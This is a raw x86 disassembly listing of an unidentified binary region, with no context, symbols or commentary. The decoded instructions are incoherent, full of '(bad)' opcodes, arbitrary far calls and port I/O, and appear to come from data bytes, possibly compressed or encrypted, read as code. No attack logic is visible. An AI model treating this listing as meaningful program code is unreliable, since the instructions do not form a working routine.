  41bbaa:	adc    BYTE PTR [esi-0x3d2da96c],ch
  41bbb0:	sbb    eax,0x5e2b1351
  41bbb5:	test   al,0x84
  41bbb7:	jmp    0xa8361d29
  41bbbc:	pusha  
  41bbbd:	rcl    DWORD PTR [ebx-0x7b],0x6a
  41bbc1:	nop
  41bbc2:	scas   al,BYTE PTR es:[edi]
  41bbc3:	mov    dh,0x5
  41bbc5:	cwde   
  41bbc6:	lods   al,BYTE PTR ds:[esi]
  41bbc7:	inc    eax
  41bbc8:	lods   al,BYTE PTR ds:[esi]
  41bbc9:	loope  0x41bb78
  41bbcb:	pop    edi
  41bbcc:	lahf   
  41bbcd:	xor    DWORD PTR ds:0x1355ebb,eax
  41bbd3:	jp     0x41bbaf
  41bbd5:	imul   esp,DWORD PTR ds:0xd46b45f3,0x2d1a3fdc
  41bbdf:	or     edi,DWORD PTR fs:[ecx-0x4c344a65]
  41bbe6:	push   cs
  41bbe7:	ror    DWORD PTR [eax],0xe1
  41bbea:	aas    
  41bbeb:	mov    bh,0xca
  41bbed:	test   eax,0xcf6bc9ad
  41bbf2:	das    
  41bbf3:	mov    bh,0x86
  41bbf5:	push   es
  41bbf6:	in     eax,0x60
  41bbf8:	push   ds
  41bbf9:	(bad)  
  41bbfa:	adc    al,0x33
  41bbfc:	std    
  41bbfd:	pop    ds
  41bbfe:	imul   ecx,DWORD PTR [ecx+eax*8+0x1331bca5],0xffffffeb
  41bc06:	lahf   
  41bc07:	jecxz  0x41bc0e
  41bc09:	pop    ecx
  41bc0a:	or     al,0x6a
  41bc0c:	and    eax,0xa743c621
  41bc11:	dec    ecx
  41bc12:	mov    ecx,0xc800944b
  41bc17:	mov    dl,0x4f
  41bc19:	lds    esi,FWORD PTR [ebp+0x1b529779]
  41bc1f:	outs   dx,DWORD PTR ds:[esi]
  41bc20:	(bad)  
  41bc21:	fmul   DWORD PTR [ebx+0x73d60c19]
  41bc27:	daa    
  41bc28:	addr16 iret 
  41bc2a:	outs   dx,BYTE PTR ds:[esi]
  41bc2b:	repnz add al,0x9f
  41bc2e:	rcl    DWORD PTR [esi-0xae76d08],0xaa
	...
  41bc95:	add    dl,dl
  41bc97:	xor    bh,dl
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0xdf88248d
  41bca4:	das    
  41bca5:	aam    0x39
  41bca7:	and    eax,0x1070001
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	pop    eax
  41bcaf:	or     al,0xb1
  41bcb1:	cmp    BYTE PTR [ebp-0x3],0x11
  41bcb5:	sub    esi,DWORD PTR [eax+0x7f]
  41bcb8:	(bad)  
  41bcb9:	pop    esp
  41bcba:	mov    ah,0xc1
  41bcbc:	aaa    
  41bcbd:	repz popf 
  41bcbf:	shl    DWORD PTR [edi-0x11],cl
  41bcc2:	push   esi
  41bcc3:	loope  0x41bc8d
  41bcc5:	and    eax,0x1c4cbf47
  41bcca:	int    0x96
  41bccc:	fadd   DWORD PTR [ebx]
  41bcce:	and    ecx,ecx
  41bcd0:	test   dl,dl
  41bcd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcd3:	popf   
  41bcd4:	mov    bl,0x3c
  41bcd6:	push   dx
  41bcd8:	dec    esi
  41bcd9:	push   0x5d
  41bcdb:	adc    DWORD PTR [edi],ebx
  41bcdd:	int3   
  41bcde:	test   DWORD PTR [edx+0x2cf5b7b],esp
  41bce4:	clc    
  41bce5:	cmp    bh,bl
  41bce7:	out    dx,al
  41bce8:	or     eax,0xb42fc16b
  41bced:	xchg   ebp,eax
  41bcee:	popf   
  41bcef:	daa    
  41bcf0:	or     eax,0x50
  41bcf3:	dec    edx
  41bcf4:	xor    BYTE PTR [eax+edx*8+0x77],cl
  41bcf8:	(bad)  
  41bcf9:	imul   edi
  41bcfb:	pusha  
  41bcfc:	push   esp
  41bcfd:	test   DWORD PTR [eax],esp
  41bcff:	sbb    al,0xb6
  41bd01:	cmp    ebx,eax
  41bd03:	pop    es
  41bd04:	jmp    0xdef0c930
  41bd09:	lock mov ebx,0x5c052224
  41bd0f:	jne    0x41bd4d
  41bd11:	addr16 stc 
  41bd13:	mov    edx,0x29f08aba
  41bd18:	frstor [esi+eiz*8-0x1e]
  41bd1c:	dec    ebx
  41bd1d:	(bad)  [eax+0x4a]
  41bd20:	outs   dx,BYTE PTR ds:[esi]
  41bd21:	enter  0x2565,0x2e
  41bd25:	push   ebp
  41bd26:	repnz push edx
  41bd28:	clc    
  41bd29:	rol    DWORD PTR [ebx+ebx*8+0x51],0x1c
  41bd2e:	mov    esi,0xa8e8c962
  41bd33:	call   0x88b7:0x2916c51b
  41bd3a:	sbb    ebp,edi
  41bd3c:	cs xchg ebp,eax
  41bd3e:	ss sbb eax,0x3afdd8ac
  41bd44:	or     al,0x97
  41bd46:	out    0xae,al
  41bd48:	and    edi,DWORD PTR [ebx]
  41bd4a:	test   ax,0xab4e
  41bd4e:	jb     0x41bd43
  41bd50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd51:	sub    BYTE PTR [ebp+0x17],0xc9
  41bd55:	add    dl,BYTE PTR [edi+0x28e441e9]
  41bd5b:	xor    eax,0xedb16ab1
  41bd60:	dec    DWORD PTR [esi]
  41bd62:	jmp    0x41bd9d
  41bd64:	mov    bh,0x85
  41bd66:	ins    BYTE PTR es:[edi],dx
  41bd67:	xchg   ebx,eax
  41bd68:	leave  
  41bd69:	dec    ebp
  41bd6a:	dec    edx
  41bd6b:	(bad)  
  41bd6c:	leave  
  41bd6d:	leave  
  41bd6e:	xchg   ebp,eax
  41bd6f:	sar    eax,1
  41bd71:	sub    esi,eax
  41bd73:	push   es
  41bd74:	and    esp,DWORD PTR [eax+ebx*1+0x46d99bf5]
  41bd7b:	ror    DWORD PTR [esp+eax*8],cl
  41bd7e:	fbld   TBYTE PTR [ecx+0x6b205b96]
  41bd84:	xlat   BYTE PTR ds:[ebx]
  41bd85:	adc    dh,BYTE PTR [ecx]
  41bd87:	mov    dh,dh
  41bd89:	push   ebp
  41bd8a:	shr    al,1
  41bd8c:	sub    DWORD PTR [ecx+0xe9ecbf2],ecx
  41bd92:	popa   
  41bd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd94:	xchg   edx,eax
  41bd95:	ins    BYTE PTR es:[edi],dx
  41bd96:	jne    0x41bde9
  41bd98:	scas   al,BYTE PTR es:[edi]
  41bd99:	dec    eax
  41bd9a:	pop    ds
  41bd9b:	scas   al,BYTE PTR es:[edi]
  41bd9c:	retf   0x28b0
  41bd9f:	test   BYTE PTR [esi-0x7a],cl
  41bda2:	pop    edi
  41bda3:	(bad)  
  41bda4:	out    0x10,eax
  41bda6:	mov    ah,0x34
  41bda8:	loopne 0x41be12
  41bdaa:	jge    0x41bd8b
  41bdac:	jge    0x41bdcd
  41bdae:	stc    
  41bdaf:	push   ecx
  41bdb0:	mov    eax,ds:0xa1fd3982
	...
  41be15:	add    BYTE PTR [ebp-0x63956373],al
  41be1b:	jnp    0x41be14
  41be1d:	out    dx,eax
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	outs   dx,BYTE PTR ds:[esi]
  41be23:	das    
  41be24:	lds    ecx,FWORD PTR [ebp+0x40]
  41be27:	add    DWORD PTR es:[eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    bh,bl
  41be2f:	neg    DWORD PTR ds:0x7833
  41be34:	xchg   ecx,eax
  41be35:	xor    bh,BYTE PTR [edi]
  41be37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be38:	cmp    al,0xfb
  41be3a:	stc    
  41be3b:	nop
  41be3c:	mov    ds:0xf88911d5,al
  41be41:	cmp    ebx,ecx
  41be43:	aad    0x25
  41be45:	not    DWORD PTR [eax+0x4a8f70b]
  41be4b:	xchg   ecx,edi
  41be4d:	es in  al,dx
  41be4f:	in     eax,dx
  41be50:	mov    esp,DWORD PTR [edi+ebp*8+0x78]
  41be54:	pop    ecx
  41be55:	dec    eax
  41be56:	fsubr  QWORD PTR [eax]
  41be58:	and    edx,esi
  41be5a:	out    dx,eax
  41be5b:	push   ebp
  41be5c:	mov    ch,0xda
  41be5e:	lock mov DWORD PTR [edi-0x1b93af27],esi
  41be65:	pop    eax
  41be66:	inc    ebp
  41be67:	add    esi,DWORD PTR [edi]
  41be69:	jle    0x41bdee
  41be6b:	dec    edx
  41be6c:	daa    
  41be6d:	fisubr WORD PTR [ebx+0x30]
  41be70:	call   FWORD PTR [ebp+0x394ebcc1]
  41be76:	dec    edx
  41be77:	jne    0x41be47
  41be79:	push   ss
  41be7a:	fwait
  41be7b:	call   0x7283:0xc907bad7
  41be82:	fstp   QWORD PTR [ecx]
  41be84:	mov    cl,0x85
  41be86:	cmp    cl,BYTE PTR [esi+0x71f45c51]
  41be8c:	aas    
  41be8d:	xchg   ecx,eax
  41be8e:	aam    0x4e
  41be90:	mov    bl,0xc7
  41be92:	push   edi
  41be93:	repz scas eax,DWORD PTR es:[edi]
  41be95:	(bad)  
  41be96:	adc    DWORD PTR [eax-0x1b],eax
  41be99:	cdq    
  41be9a:	pop    eax
  41be9b:	fbld   TBYTE PTR [ebx-0x72]
  41be9e:	hlt    
  41be9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea0:	ins    BYTE PTR es:[edi],dx
  41bea1:	aam    0x93
  41bea3:	jp     0x41becb
  41bea5:	out    dx,eax
  41bea6:	icebp  
  41bea7:	mov    esp,0xbc1a5d5b
  41beac:	call   0xc109:0x1d2d9acd
  41beb3:	stc    
  41beb4:	mov    dl,0x39
  41beb6:	mov    edi,0xf8b8ad6
  41bebb:	add    dh,BYTE PTR [eax+0x22]
  41bebe:	or     eax,0xa06fa8f5
  41bec3:	mov    bh,0x45
  41bec5:	sti    
  41bec6:	leave  
  41bec7:	sbb    edx,ecx
  41bec9:	mov    dh,0xce
  41becb:	dec    ebp
  41becc:	mov    edi,0x2ec86e61
  41bed1:	cld    
  41bed2:	outs   dx,DWORD PTR ds:[esi]
  41bed3:	imul   esi,DWORD PTR [ebx+0x6e],0xffffffc4
  41bed7:	stc    
  41bed8:	ss push esp
  41beda:	mov    ebx,0x59c97072
  41bedf:	pushf  
  41bee0:	sbb    eax,0x4f6f5fc
  41bee5:	test   DWORD PTR [ecx+0x2a],ebp
  41bee8:	shl    edx,1
  41beea:	retf   0x7f30
  41beed:	push   ds
  41beee:	pop    edx
  41beef:	call   FWORD PTR [eax+0x6ffc6dca]
  41bef5:	xchg   edi,eax
  41bef6:	lods   al,BYTE PTR ds:[esi]
  41bef7:	sbb    ch,BYTE PTR [esi+0x6b]
  41befa:	ins    DWORD PTR es:[edi],dx
  41befb:	and    edx,DWORD PTR [ebx+0x2113953c]
  41bf01:	(bad)  
  41bf02:	frstor [edi]
  41bf04:	cli    
  41bf05:	and    bh,bh
  41bf07:	mov    edx,0x75a08add
  41bf0c:	ja     0x41bf49
  41bf0e:	test   BYTE PTR [eax],bl
  41bf10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf11:	jns    0x41bf54
  41bf13:	jne    0x41bf93
  41bf15:	adc    ah,dl
  41bf17:	cmp    esp,esp
  41bf19:	cmp    ebp,0x94983c76
  41bf1f:	pop    edi
  41bf20:	test   al,0x11
  41bf22:	mov    ds:0x97762fa8,al
  41bf27:	pop    ebx
  41bf28:	std    
  41bf29:	xchg   edx,eax
  41bf2a:	jbe    0x41bece
  41bf2c:	push   es
  41bf2d:	inc    esi
  41bf2e:	mov    bh,ch
  41bf30:	arpl   WORD PTR [esp+edi*4+0x25],cx
  41bf34:	or     al,BYTE PTR [eax]
	...
  41bf96:	fs jae 0x41bfcc
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfa3:	imul   edi,DWORD PTR [eax],0x12747ca
  41bfa9:	add    BYTE PTR [edi],al
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR ds:0x2cc5aeba,al
  41bfb3:	cmp    bl,BYTE PTR [edi]
  41bfb5:	sub    dh,BYTE PTR [eax-0x30b7a1b0]
  41bfbb:	lock sub ch,BYTE PTR [edi+0x1d7aed05]
  41bfc2:	jp     0x41bf67
  41bfc4:	push   edi
  41bfc5:	dec    ebp
  41bfc6:	pop    eax
  41bfc7:	sub    dh,bl
  41bfc9:	sub    al,0x6b
  41bfcb:	mov    ebp,0xde7070a9
  41bfd0:	push   ss
  41bfd1:	sub    BYTE PTR [ecx+ebx*4+0x4cc268],ah
  41bfd8:	sbb    BYTE PTR [edx-0x7],0x87
  41bfdc:	out    dx,eax
  41bfdd:	xor    DWORD PTR [edx],eax
  41bfdf:	lds    edx,FWORD PTR [ebx-0xd]
  41bfe2:	xor    BYTE PTR [ebx],0x7a
  41bfe5:	cmp    al,0xee
  41bfe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfe8:	lods   al,BYTE PTR ds:[esi]
  41bfe9:	fcmove st,st(7)
  41bfeb:	les    eax,FWORD PTR [eax+ebx*4]
  41bfee:	mov    ah,0xec
  41bff0:	fdivr  DWORD PTR [eax+0x57]
  41bff3:	cmp    DWORD PTR [eax*2+0x1ec3822e],esp
  41bffa:	lds    ebx,FWORD PTR es:[edi]
  41bffd:	add    DWORD PTR [eax+0x7f466d05],ecx
  41c003:	push   eax
  41c004:	jns    0x41bfc4
  41c006:	addr16 mov ebp,0xa5609746
  41c00c:	mov    al,0x1a
  41c00e:	dec    BYTE PTR [ebp+0x52]
  41c011:	xor    esp,DWORD PTR [edi+0x76]
  41c014:	imul   esp,DWORD PTR [eax+esi*1],0xffffffbf
  41c018:	adc    BYTE PTR ds:[esi+ebx*1-0x24],cl
  41c01d:	ins    DWORD PTR es:[edi],dx
  41c01e:	leave  
  41c01f:	push   esp
  41c020:	mov    ebp,0x294c7f2
  41c025:	push   ds
  41c026:	sub    DWORD PTR [ebp+0x52],ecx
  41c029:	(bad)  
  41c02a:	call   0x7bf59e9
  41c02f:	inc    eax
  41c030:	mov    ch,0xbd
  41c032:	push   edi
  41c033:	cwde   
  41c034:	pop    eax
  41c035:	inc    ebx
  41c036:	cmp    eax,0x8d4fbd3f
  41c03b:	dec    ebp
  41c03c:	repnz fadd DWORD PTR [eax+edx*2-0xc4f231b]
  41c044:	mov    al,dl
  41c046:	mov    dl,0xc9
  41c048:	mov    ebp,0xf6ada2fd
  41c04d:	pushf  
  41c04e:	jle    0x41bfff
  41c050:	or     DWORD PTR [eax-0x36],edi
  41c053:	fwait
  41c054:	lahf   
  41c055:	shl    DWORD PTR [ebp-0x25f6b1ed],cl
  41c05b:	mov    bl,0xf3
  41c05d:	in     al,0x85
  41c05f:	push   ebp
  41c060:	mov    dl,0x2
  41c062:	dec    ecx
  41c063:	fdiv   DWORD PTR [ebp+0x55]
  41c066:	cld    
  41c067:	mov    ebp,0xa3f559ce
  41c06c:	xor    eax,0xd2d13f36
  41c071:	inc    edx
  41c072:	frstor ds:0xe9c6bc89
  41c078:	jge    0x41bfff
  41c07a:	dec    edi
  41c07b:	mov    dh,0xcf
  41c07d:	sub    al,0xb9
  41c07f:	adc    eax,DWORD PTR gs:[ebx+esi*1]
  41c083:	jmp    0x7ae30b63
  41c088:	sbb    DWORD PTR [edx+0x3b25c2e6],ebx
  41c08e:	outs   dx,DWORD PTR ds:[esi]
  41c08f:	add    ebx,DWORD PTR [edi+0xa]
  41c092:	xor    ecx,edx
  41c094:	push   es
  41c095:	mov    cl,0x73
  41c097:	int3   
  41c098:	adc    al,0x2e
  41c09a:	mov    ebx,es
  41c09c:	adc    edi,edi
  41c09e:	mov    BYTE PTR [eax+0x4b3c8476],0x1d
  41c0a5:	xchg   ebp,eax
  41c0a6:	xor    esi,ecx
  41c0a8:	outs   dx,BYTE PTR ds:[esi]
  41c0a9:	and    dh,BYTE PTR [edi]
  41c0ab:	push   0x11eab3fe
  41c0b0:	inc    ecx
  41c0b1:	fs out 0x34,eax
  41c0b4:	and    BYTE PTR [eax],al
	...
  41c116:	(bad)  [edx-0x5f]
  41c119:	clc    
  41c11a:	mov    bl,0xfb
  41c11c:	fldcw  WORD PTR [ebx+0x49]
  41c11f:	xlat   BYTE PTR ds:[ebx]
  41c120:	mov    ebp,0xf4501cf8
  41c125:	test   eax,0x1284e
  41c12a:	pop    es
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [esi-0x35],cl
  41c130:	jae    0x41c15a
  41c132:	add    eax,esp
  41c134:	sub    al,0xf6
  41c136:	repnz cmc 
  41c138:	jge    0x41c101
  41c13a:	loopne 0x41c13a
  41c13c:	iret   
  41c13d:	jmp    FWORD PTR [edi+0x6e]
  41c140:	push   es
  41c141:	push   eax
  41c142:	push   ss
  41c143:	(bad)  
  41c144:	cld    
  41c145:	mov    ch,0x84
  41c147:	test   DWORD PTR [ebx+0x6bde006a],edx
  41c14d:	aas    
  41c14e:	int    0x23
  41c150:	sub    ch,bh
  41c152:	ror    BYTE PTR [edx],0xeb
  41c155:	repz sti 
  41c157:	xor    DWORD PTR [esi+0x33],edx
  41c15a:	and    cl,cl
  41c15c:	dec    esi
  41c15d:	sahf   
  41c15e:	cmp    al,0x1e
  41c160:	or     al,0x92
  41c162:	(bad)  
  41c163:	dec    eax
  41c164:	cmp    al,0xa2
  41c166:	jbe    0x41c102
  41c168:	add    eax,0x60aaf3d9
  41c16d:	jbe    0x41c107
  41c16f:	push   ds
  41c170:	loope  0x41c1f0
  41c172:	xchg   ecx,eax
  41c173:	pop    es
  41c174:	scas   al,BYTE PTR es:[edi]
  41c175:	out    dx,eax
  41c176:	pop    esp
  41c177:	cmp    bh,cl
  41c179:	xchg   ebp,eax
  41c17a:	je     0x41c140
  41c17c:	fistp  WORD PTR [esi]
  41c17e:	add    DWORD PTR [ecx+0x4b],eax
  41c181:	jae    0x41c129
  41c183:	xor    BYTE PTR [esi],ch
  41c185:	imul   esp,DWORD PTR [eax+edx*1],0x4f
  41c189:	inc    edx
  41c18a:	sbb    edi,DWORD PTR [eax+esi*2+0xe]
  41c18e:	or     cl,BYTE PTR [esp+eax*8]
  41c191:	mov    esp,0xb14cb16e
  41c196:	jmp    0x41c1e0
  41c198:	repnz repnz push ecx
  41c19b:	jb     0x41c1bb
  41c19d:	or     eax,0x938edad1
  41c1a2:	push   esi
  41c1a3:	adc    BYTE PTR [eax],ch
  41c1a5:	sbb    edi,DWORD PTR [ecx]
  41c1a7:	and    al,0x2
  41c1a9:	daa    
  41c1aa:	ret    0xa22d
  41c1ad:	ja     0x41c1ae
  41c1af:	addr16 jl 0x41c174
  41c1b2:	dec    eax
  41c1b3:	test   DWORD PTR [ebx+0x1499dc67],esp
  41c1b9:	add    DWORD PTR gs:[edx-0x479d9ceb],esi
  41c1c0:	and    dh,BYTE PTR [ecx-0x16fab1eb]
  41c1c6:	fnsave [ecx-0x19]
  41c1c9:	push   es
  41c1ca:	pop    ebx
  41c1cb:	leave  
  41c1cc:	bound  edx,QWORD PTR [edi]
  41c1ce:	(bad)  
  41c1cf:	retf   
  41c1d0:	loope  0x41c1e6
  41c1d2:	sub    DWORD PTR ds:0xe776f399,ecx
  41c1d8:	dec    ebp
  41c1d9:	arpl   WORD PTR [eax],bx
  41c1db:	in     eax,dx
  41c1dc:	stos   BYTE PTR es:[edi],al
  41c1dd:	fistp  WORD PTR [edi-0x72]
  41c1e0:	sbb    bh,BYTE PTR [edx-0x6c52110c]
  41c1e6:	mov    ah,0x50
  41c1e8:	lds    esp,FWORD PTR [edx+eiz*1+0x12]
  41c1ec:	pop    esi
  41c1ed:	inc    edx
  41c1ee:	add    eax,0xe066cbbd
  41c1f3:	cmp    DWORD PTR [edi+0x22ff6f66],ecx
  41c1f9:	loope  0x41c231
  41c1fb:	aas    
  41c1fc:	dec    eax
  41c1fd:	xchg   DWORD PTR [edi],ebx
  41c1ff:	out    dx,eax
  41c200:	ret    
  41c201:	mov    BYTE PTR [edi+ebx*2+0x4a60ba73],ah
  41c208:	cmp    eax,0xe67cdf48
  41c20d:	mov    BYTE PTR [edx-0x322cfe2e],cl
  41c213:	xor    DWORD PTR ds:0x6cd6eb22,edi
  41c219:	pop    edx
  41c21a:	or     ah,BYTE PTR [ebp+0x48]
  41c21d:	xchg   bp,ax
  41c220:	jo     0x41c278
  41c222:	lock dec esi
  41c224:	push   0xe798e53d
  41c229:	jno    0x41c1e0
  41c22b:	xchg   edx,eax
  41c22c:	jp     0x41c1ef
  41c22e:	jmp    0x41c29a
  41c230:	jnp    0x41c279
  41c232:	xor    DWORD PTR [ebx+0xab],0x0
	...
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	xor    BYTE PTR [esi+0x29550713],bh
  41c2a8:	add    DWORD PTR [eax],eax
  41c2aa:	pop    es
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    cl,ah
  41c2af:	cmp    cl,BYTE PTR [esi+0x1f]
  41c2b2:	xor    ebx,esp
  41c2b4:	enter  0x35e4,0x15
  41c2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b9:	test   eax,0x59bd6282
  41c2be:	and    al,0x64
  41c2c0:	pop    ebx
  41c2c1:	inc    ecx
  41c2c2:	test   al,0x1b
  41c2c4:	scas   eax,DWORD PTR es:[edi]
  41c2c5:	gs fs inc ebx
  41c2c8:	add    ebx,eax
  41c2ca:	rcr    BYTE PTR [esi],0x86
  41c2cd:	adc    edx,ecx
  41c2cf:	lds    ebp,FWORD PTR [ebx-0x5]
  41c2d2:	cwde   
  41c2d3:	adc    edx,DWORD PTR ss:[edi-0x43]
  41c2d7:	repz cld 
  41c2d9:	mov    ebp,DWORD PTR [ebx]
  41c2db:	xor    BYTE PTR [esi-0x61488480],bl
  41c2e1:	sbb    esi,DWORD PTR [ebp+0x5fb2e42c]
  41c2e7:	add    al,0xa0
  41c2e9:	and    eax,0x407f9092
  41c2ee:	cmp    al,0x1f
  41c2f0:	mov    bh,0x3f
  41c2f2:	lea    ecx,[ecx+edx*1-0x952f5c9]
  41c2f9:	bnd je 0x41c322
  41c2fc:	add    ecx,edx
  41c2fe:	and    ebp,DWORD PTR [edi-0x73754a74]
  41c304:	jo     0x41c2c9
  41c306:	sti    
  41c307:	iret   
  41c308:	adc    DWORD PTR [ebp+0x5f],ecx
  41c30b:	adc    ch,0x21
  41c30e:	sub    BYTE PTR [ebp-0x6ada3134],al
  41c314:	scas   eax,DWORD PTR es:[edi]
  41c315:	sbb    BYTE PTR [edx-0xf06e01a],ch
  41c31b:	add    al,BYTE PTR [edi]
  41c31d:	(bad)  
  41c31e:	mov    ebx,0x280affea
  41c323:	sub    edi,edi
  41c325:	push   esi
  41c326:	pop    ecx
  41c327:	xor    BYTE PTR [eax+ebp*8-0x444249c0],0x6b
  41c32f:	in     eax,dx
  41c330:	daa    
  41c331:	pop    ss
  41c332:	aad    0x61
  41c334:	mov    esp,DWORD PTR fs:[edi-0x22c61ee]
  41c33b:	mov    bl,0xf2
  41c33d:	cld    
  41c33e:	push   edi
  41c33f:	mov    ecx,0xcbed9788
  41c344:	mov    edi,0xa2d4122
  41c349:	daa    
  41c34a:	ja     0x41c355
  41c34c:	loop   0x41c307
  41c34e:	jge    0x41c2e7
  41c350:	fistp  DWORD PTR [edi-0xc0f1899]
  41c356:	add    al,0xfc
  41c358:	stos   DWORD PTR es:[edi],eax
  41c359:	test   DWORD PTR [ecx-0x10],edi
  41c35c:	push   ebx
  41c35d:	dec    edi
  41c35e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c35f:	pop    ebx
  41c360:	imul   ebp,DWORD PTR [ecx-0xd76bdee],0x56
  41c367:	jecxz  0x41c2fe
  41c369:	mov    ch,0xf6
  41c36b:	sbb    ah,BYTE PTR [edx+0x356feb77]
  41c371:	int    0xa9
  41c373:	dec    esp
  41c374:	das    
  41c375:	mov    esi,0xa1c50b34
  41c37a:	sub    BYTE PTR [esi],ah
  41c37c:	push   edi
  41c37d:	sbb    bh,BYTE PTR [edi+edi*8+0x22]
  41c381:	mov    al,0xe3
  41c383:	std    
  41c384:	add    BYTE PTR [eax],al
  41c386:	daa    
  41c387:	in     eax,0x7a
  41c389:	nop
  41c38a:	xor    ebx,DWORD PTR [edi+0x50f4f355]
  41c390:	add    DWORD PTR [esi],esi
  41c392:	cld    
  41c393:	cwde   
  41c394:	ror    esi,1
  41c396:	jl     0x41c325
  41c398:	ret    
  41c399:	xchg   edx,eax
  41c39a:	ins    BYTE PTR es:[edi],dx
  41c39b:	ret    0x941
  41c39e:	aam    0x8
  41c3a0:	in     eax,0x8
  41c3a2:	mov    BYTE PTR [ebx-0x222f0040],bl
  41c3a8:	or     eax,0x764e2079
  41c3ad:	mov    dh,0xa6
  41c3af:	mov    ecx,0x42c97213
  41c3b4:	pop    ebp
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [esi+eax*2-0x72]
  41c424:	pop    edi
  41c425:	push   edi
  41c426:	pop    esp
  41c427:	sub    al,BYTE PTR [ecx]
  41c429:	add    BYTE PTR [edi],al
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [eax+edx*2],dl
  41c430:	or     ah,ch
  41c432:	bound  ebp,QWORD PTR [ecx+edi*1+0x408f47e8]
  41c439:	push   edx
  41c43a:	fimul  WORD PTR [edi-0x45]
  41c43d:	or     ah,BYTE PTR [ecx-0x5e]
  41c440:	je     0x41c454
  41c442:	or     BYTE PTR [edi+0x3],cl
  41c445:	int    0x37
  41c447:	push   ss
  41c448:	sub    DWORD PTR [edx-0x1f276970],edx
  41c44e:	push   0x9
  41c450:	push   edi
  41c451:	mov    cl,0x46
  41c453:	jecxz  0x41c437
  41c455:	loope  0x41c48d
  41c457:	or     bl,0x35
  41c45a:	xor    eax,0xbd6fedd5
  41c45f:	mov    edi,DWORD PTR [edx-0x9955b16]
  41c465:	add    BYTE PTR ds:0x7d6da834,dl
  41c46b:	mov    dl,0x19
  41c46d:	push   esi
  41c46e:	inc    eax
  41c46f:	iret   
  41c470:	aas    
  41c471:	xchg   esi,eax
  41c472:	call   0x6ce3:0x1cd5582c
  41c479:	arpl   ax,di
  41c47b:	jo     0x41c4bb
  41c47d:	dec    DWORD PTR [ebx+0x28449e47]
  41c483:	fcom   DWORD PTR [edi-0x74]
  41c486:	in     eax,0xc0
  41c488:	outs   dx,DWORD PTR es:[esi]
  41c48a:	int3   
  41c48b:	sbb    BYTE PTR [esi],ah
  41c48d:	inc    esp
  41c48e:	loop   0x41c45d
  41c490:	pop    ebx
  41c491:	(bad)  
  41c492:	(bad)  
  41c493:	ds call 0xe991:0x44abb60a
  41c49b:	xor    DWORD PTR [edi+0x13],esi
  41c49e:	or     BYTE PTR [eax],0x1
  41c4a1:	popf   
  41c4a2:	retf   0x3ef3
  41c4a5:	sbb    DWORD PTR [edi+0x6e],0xffffffe6
  41c4a9:	ret    0x518d
  41c4ac:	and    DWORD PTR [ebx-0x7],ebx
  41c4af:	outs   dx,BYTE PTR ds:[esi]
  41c4b0:	push   ebx
  41c4b1:	dec    ebp
  41c4b2:	(bad)  
  41c4b3:	sub    DWORD PTR [ecx+0x6fb8c182],edx
  41c4b9:	cmc    
  41c4ba:	aam    0x8f
  41c4bc:	dec    esi
  41c4bd:	add    al,0x1
  41c4bf:	das    
  41c4c0:	mov    ecx,DWORD PTR [edx]
  41c4c2:	stc    
  41c4c3:	xor    ch,ah
  41c4c5:	mov    ecx,0xfc11c6c2
  41c4ca:	shr    BYTE PTR [eax-0x105e020f],0x58
  41c4d1:	sahf   
  41c4d2:	fmul   QWORD PTR [ecx+0x75f34ef8]
  41c4d8:	mov    ebp,0xe6963b5b
  41c4dd:	test   esi,esp
  41c4df:	mov    ah,0x67
  41c4e1:	sub    bh,ah
  41c4e3:	xor    al,0x7a
  41c4e5:	addr16 pop ebx
  41c4e7:	push   cs
  41c4e8:	push   ebp
  41c4e9:	dec    ecx
  41c4ea:	mov    BYTE PTR [esi+0x492aa1ee],0xfe
  41c4f1:	aaa    
  41c4f2:	mov    edi,0x70d1ee79
  41c4f7:	cli    
  41c4f8:	test   edx,0x6a9ed03
  41c4fe:	repnz adc al,0x91
  41c501:	sahf   
  41c502:	fstp   QWORD PTR [ecx-0x32]
  41c505:	push   0x5b
  41c507:	dec    ebx
  41c508:	jb     0x41c538
  41c50a:	xchg   edx,eax
  41c50b:	clc    
  41c50c:	(bad)  
  41c50d:	(bad)  
  41c50e:	in     al,dx
  41c50f:	in     al,dx
  41c510:	mov    DWORD PTR [edx+0x1518ca37],0x623bf281
  41c51a:	rol    DWORD PTR [eax+eiz*1+0x2f4c7a3c],1
  41c521:	pop    edi
  41c522:	cmp    eax,0xbafb55c5
  41c527:	push   edi
  41c528:	pop    edx
  41c529:	inc    edi
  41c52a:	dec    eax
  41c52b:	out    0xe5,al
  41c52d:	fbstp  TBYTE PTR [edi+0x3a0d433d]
  41c533:	push   cs
  41c534:	icebp  
	...
  41c595:	add    ch,al
